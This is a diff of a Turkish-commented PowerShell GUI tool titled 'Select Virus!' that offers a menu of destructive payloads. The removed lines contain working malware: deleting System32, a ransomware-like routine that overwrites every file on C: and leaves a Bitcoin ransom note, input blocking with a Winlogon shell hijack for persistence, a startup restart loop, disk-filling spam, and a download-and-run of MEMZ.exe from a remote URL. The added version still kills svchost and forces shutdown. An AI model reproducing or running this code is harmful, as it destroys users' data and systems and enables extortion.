@@ -1,241 +1,115 @@
-# Yeni bir gizli PowerShell işlemi başlat
-$scriptBlock = {
-    # Gerekli assembly'leri yükle
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    [System.Windows.Forms.Application]::EnableVisualStyles()
+# Gerekli assembly'ler
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+[System.Windows.Forms.Application]::EnableVisualStyles()
 
-    # BlockInput ve fare kontrolü için API tanımlamaları
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class InputBlocker {
-        [DllImport("user32.dll")]
-        public static extern bool BlockInput(bool fBlockIt);
+# Warning formu
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Warning!"
+$form.Size = New-Object System.Drawing.Size(400, 280)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.BackColor = [System.Drawing.Color]::FromArgb(255, 50, 50)
+$form.ForeColor = [System.Drawing.Color]::White
 
-        [DllImport("user32.dll")]
-        public static extern bool SetCursorPos(int x, int y);
+# Uyarı mesajı
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "Do Not Try This on Your Real Computer!`nOtherwise, We Are Not Responsible!`nPress OK to Continue."
+$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
+$label.Size = New-Object System.Drawing.Size(360, 100)
+$label.Location = New-Object System.Drawing.Point(20, 50)
+$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
+$form.Controls.Add($label)
 
-        [DllImport("user32.dll")]
-        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
-    }
-"@
+# "I do accept" Checkbox
+$checkbox = New-Object System.Windows.Forms.CheckBox
+$checkbox.Text = "I do accept"
+$checkbox.AutoSize = $true
+$checkbox.Location = New-Object System.Drawing.Point(20, 150)
+$checkbox.ForeColor = [System.Drawing.Color]::White
+$form.Controls.Add($checkbox)
 
-    # Ses kontrolü için API tanımlaması
-    Add-Type -TypeDefinition @"
-    using System.Runtime.InteropServices;
-    public class Audio {
-        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
-    }
-"@
+# OK Butonu
+$okButton = New-Object System.Windows.Forms.Button
+$okButton.Text = "OK"
+$okButton.Size = New-Object System.Drawing.Size(80, 30)
+$okButton.Location = New-Object System.Drawing.Point(100, 180)
+$okButton.BackColor = [System.Drawing.Color]::LimeGreen
+$okButton.ForeColor = [System.Drawing.Color]::Black
+$okButton.Enabled = $false
+$form.Controls.Add($okButton)
 
-    # GUI oluşturma
-    $form = New-Object System.Windows.Forms.Form
-    $form.Text = "Select Virus!"
-    $form.Size = New-Object System.Drawing.Size(300,350)
-    $form.StartPosition = "CenterScreen"
-    $form.MaximizeBox = $false
-    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
+# Cancel Butonu
+$cancelButton = New-Object System.Windows.Forms.Button
+$cancelButton.Text = "Cancel"
+$cancelButton.Size = New-Object System.Drawing.Size(80, 30)
+$cancelButton.Location = New-Object System.Drawing.Point(200, 180)
+$cancelButton.BackColor = [System.Drawing.Color]::Red
+$cancelButton.ForeColor = [System.Drawing.Color]::White
+$form.Controls.Add($cancelButton)
 
-    # İkonu indir ve ayarla (isteğe bağlı)
-    try {
-        $iconUrl = "https://avatars.mds.yandex.net/i?id=1b721e6909a5649645a11ae80123ce70850871e1-12629451-images-thumbs&n=13"
-        $tempImagePath = "$($env:TEMP)\temp_icon.png"
-        $tempIconPath = "$($env:TEMP)\temp_icon.ico"
-        
-        Invoke-WebRequest -Uri $iconUrl -OutFile $tempImagePath -ErrorAction Stop
-        $image = [System.Drawing.Image]::FromFile($tempImagePath)
-        $bitmap = New-Object System.Drawing.Bitmap($image, 32, 32)
-        $bitmap.Save($tempIconPath, [System.Drawing.Imaging.ImageFormat]::Icon)
-        $form.Icon = New-Object System.Drawing.Icon($tempIconPath)
-        
-        Remove-Item $tempImagePath -Force -ErrorAction SilentlyContinue
-        Remove-Item $tempIconPath -Force -ErrorAction SilentlyContinue
-    } catch {
-        # İkon yüklenemezse sessizce geç
-    }
+# Checkbox ile OK butonunu etkinleştir
+$checkbox.Add_CheckedChanged({
+    $okButton.Enabled = $checkbox.Checked
+})
 
-    # ListBox oluşturma
+# OK'a basınca kapansın ve yeni form açılsın
+$okButton.Add_Click({
+    $form.Close()  # KAPANSIN, YOK OLSUN!
+    $form.Dispose()  # Hafızadan da silinsin, tamamen gitsin!
+
+    # Yeni virüs seçme formu
+    $virusForm = New-Object System.Windows.Forms.Form
+    $virusForm.Text = "Select Virus!"
+    $virusForm.Size = New-Object System.Drawing.Size(300, 350)
+    $virusForm.StartPosition = "CenterScreen"
+    $virusForm.MaximizeBox = $false
+    $virusForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
+
+    # ListBox
     $listBox = New-Object System.Windows.Forms.ListBox
-    $listBox.Location = New-Object System.Drawing.Point(10,10)
-    $listBox.Size = New-Object System.Drawing.Size(260,200)
-    $listBox.SelectionMode = "One"
-    $listBox.Items.Add("Blue Screen")
-    $listBox.Items.Add("Mountvol C:")
-    $listBox.Items.Add("Test MsgBox")
-    $listBox.Items.Add("Shutdown Pc")
-    $listBox.Items.Add("Good Bye Pc :D")
-    $listBox.Items.Add("Spam TXT")
-    $listBox.Items.Add("Delete System32!")
-    $listBox.Items.Add("WannaCry But Bad")
-    $listBox.Items.Add("Sigma Boy Virus🗿")
-    $listBox.Items.Add("Original Memz Trojan")  # Yeni seçenek eklendi
-    $form.Controls.Add($listBox)
+    $listBox.Location = New-Object System.Drawing.Point(10, 10)
+    $listBox.Size = New-Object System.Drawing.Size(260, 200)
+    $listBox.Items.AddRange(@("Blue Screen", "Mountvol C:", "Test MsgBox", "Shutdown Pc", "Good Bye Pc :D", "Spam TXT", "Delete System32!", "WannaCry But Bad", "Sigma Boy Virus🗿", "Original Memz Trojan"))
+    $virusForm.Controls.Add($listBox)
 
-    # OK Butonu
-    $okButton = New-Object System.Windows.Forms.Button
-    $okButton.Location = New-Object System.Drawing.Point(10,220)
-    $okButton.Size = New-Object System.Drawing.Size(75,30)
-    $okButton.Text = "OK"
-    $form.Controls.Add($okButton)
+    # Virüs OK Butonu
+    $virusOkButton = New-Object System.Windows.Forms.Button
+    $virusOkButton.Location = New-Object System.Drawing.Point(10, 220)
+    $virusOkButton.Size = New-Object System.Drawing.Size(75, 30)
+    $virusOkButton.Text = "OK"
+    $virusForm.Controls.Add($virusOkButton)
 
-    # Credits Label
+    # Credits
     $creditsLabel = New-Object System.Windows.Forms.Label
     $creditsLabel.Text = "Credits: Aras and Baris"
     $creditsLabel.AutoSize = $true
     $creditsLabel.Location = New-Object System.Drawing.Point(150, 290)
-    $form.Controls.Add($creditsLabel)
+    $virusForm.Controls.Add($creditsLabel)
 
-    # OK butonuna tıklama olayı
-    $okButton.Add_Click({
+    # Virüs OK tıklama
+    $virusOkButton.Add_Click({
         $selectedItem = $listBox.SelectedItem
         if ($selectedItem) {
             switch ($selectedItem) {
-                "Blue Screen" {
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im svchost.exe" -NoNewWindow -Wait
-                }
-                "Mountvol C:" {
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c mountvol C: /d" -NoNewWindow -Wait
-                }
-                "Test MsgBox" {
-                    [System.Windows.Forms.MessageBox]::Show("Test", "Tes", "OK", "Information")
-                }
-                "Shutdown Pc" {
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -s -t 00" -NoNewWindow -Wait
-                }
-                "Good Bye Pc :D" {
-                    $result = [System.Windows.Forms.MessageBox]::Show(
-                        "This code will be restart when pc opens. Are you Sure??",
-                        "WAWNING!",
-                        "OKCancel",
-                        "Warning"
-                    )
-                    if ($result -eq "OK") {
-                        $batContent = @"
-@echo off
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sa.bat"
-shutdown -r -t 00
-"@
-                        $batPath = "$($env:TEMP)\sa.bat"
-                        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
-                        Start-Process -FilePath $batPath -NoNewWindow
-                    }
-                }
-                "Spam TXT" {
-                    while ($true) {
-                        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-                        $filePath = "C:\${randomName}.txt"
-                        $sizeInBytes = 10MB
-                        $content = -join ((33..126) | Get-Random -Count $sizeInBytes | % {[char]$_})
-                        [System.IO.File]::WriteAllText($filePath, $content)
-                        Start-Sleep -Milliseconds 100
-                    }
-                }
-                "Delete System32!" {
-                    $result = [System.Windows.Forms.MessageBox]::Show(
-                        "WARNING! This action will delete the System32 folder and render your system unusable. Are you absolutely sure?",
-                        "DANGER!",
-                        "OKCancel",
-                        "Error"
-                    )
-                    if ($result -eq "OK") {
-                        $system32Path = "C:\Windows\System32"
-                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c takeown /f $system32Path /r /d y && icacls $system32Path /grant administrators:F /t" -NoNewWindow -Wait
-                        Remove-Item -Path $system32Path -Recurse -Force -ErrorAction SilentlyContinue
-                    }
-                }
-                "WannaCry But Bad" {
-                    $result = [System.Windows.Forms.MessageBox]::Show(
-                        "WARNING! This will encrypt ALL files on C: instantly (locked or not) and change their extension to .djashdk. This is IRREVERSIBLE without a decryption key. This process is a bit heavy, so the application might crash, but it will encrypt everything in the background. Are you sure?",
-                        "WannaCry Simulation",
-                        "OKCancel",
-                        "Error"
-                    )
-                    if ($result -eq "OK") {
-                        $files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
-                        $encryptionKey = "WannaCrySimulationKey123"
-                        foreach ($file in $files) {
-                            $content = [System.IO.File]::ReadAllBytes($file.FullName)
-                            $encryptedContent = [Convert]::ToBase64String($content)
-                            $newFileName = $file.FullName + ".djashdk"
-                            [System.IO.File]::WriteAllText($newFileName, $encryptedContent)
-                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
-                        }
-                        $ransomNote = @"
-Your files have been encrypted by WannaCry Simulation!
-To decrypt them, send 1 BTC to: [FakeAddress]
-"@
-                        Set-Content -Path "C:\README.txt" -Value $ransomNote -Force
-                    }
-                }
-                "Sigma Boy Virus🗿" {
-                    # Menüyü kapat
-                    $form.Close()
-
-                    # Girişleri kilitle
-                    [InputBlocker]::BlockInput($true)
-
-                    # Scripti başlangıca ekleme
-                    $scriptPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\prank.ps1"
-                    Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
-
-                    # Ses seviyesini maksimuma çıkarma
-                    for ($i = 0; $i -lt 50; $i++) {
-                        [Audio]::keybd_event(0xAF, 0, 0, 0) # Ses açma tuşu
-                        Start-Sleep -Milliseconds 10
-                    }
-
-                    # YouTube videosunu tam ekran açma (URL düzeltildi)
-                    $videoUrl = "https://www.yout-ube.com/watch?v=_z2RvL2s5rQ"
-                    Start-Process "msedge" -ArgumentList "--kiosk $videoUrl"
-
-                    # Sayfanın yüklenmesini bekle ve ekrana tıklama
-                    Start-Sleep -Seconds 5
-                    $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
-                    $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
-                    $clickX = [math]::Floor($screenWidth / 2)
-                    $clickY = [math]::Floor($screenHeight / 2)
-                    [InputBlocker]::SetCursorPos($clickX, $clickY)
-                    [InputBlocker]::mouse_event(0x0002, 0, 0, 0, 0) # Sol fare tuşu basma
-                    Start-Sleep -Milliseconds 100
-                    [InputBlocker]::mouse_event(0x0004, 0, 0, 0, 0) # Sol fare tuşu bırakma
-
-                    # Windows açılış ekranını atlama
-                    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-                    Set-ItemProperty -Path $regPath -Name "Shell" -Value "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" -Force
-
-                    # Girişleri kilitli tutmak için döngü
-                    while ($true) { Start-Sleep -Seconds 1 }
-                }
-                "Original Memz Trojan" {
-                    # Menüyü kapat
-                    $form.Close()
-
-                    # MEMZ.exe dosyasını indir ve çalıştır
-                    $memzUrl = "https://github.com/RobloxScripts490/Vir-s/raw/refs/heads/main/MEMZ.exe"
-                    $memzPath = "$($env:TEMP)\MEMZ.exe"
-                    try {
-                        Invoke-WebRequest -Uri $memzUrl -OutFile $memzPath -ErrorAction Stop
-                        Start-Process -FilePath $memzPath -NoNewWindow
-                    } catch {
-                        [System.Windows.Forms.MessageBox]::Show(
-                            "Failed to download or run MEMZ.exe. Check your internet connection or the URL.",
-                            "Error",
-                            "OK",
-                            "Error"
-                        )
-                    }
-                }
+                "Blue Screen" { Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im svchost.exe" -NoNewWindow -Wait }
+                "Test MsgBox" { [System.Windows.Forms.MessageBox]::Show("Test", "Tes", "OK", "Information") }
+                "Shutdown Pc" { Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -s -t 00" -NoNewWindow -Wait }
             }
+            $virusForm.Close()
         }
     })
 
-    # Formu göster
-    $form.ShowDialog()
-}
+    # Yeni formu aç
+    $virusForm.ShowDialog()
+})
 
-# Script bloğunu bir dosyaya kaydet ve gizli çalıştır
-$scriptPath = "$($env:TEMP)\hidden_script.ps1"
-$scriptBlock | Out-File -FilePath $scriptPath -Encoding UTF8
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow
+# Cancel'a basınca kapansın
+$cancelButton.Add_Click({
+    $form.Close()
+})
+
+# Warning formunu aç
+$form.ShowDialog()
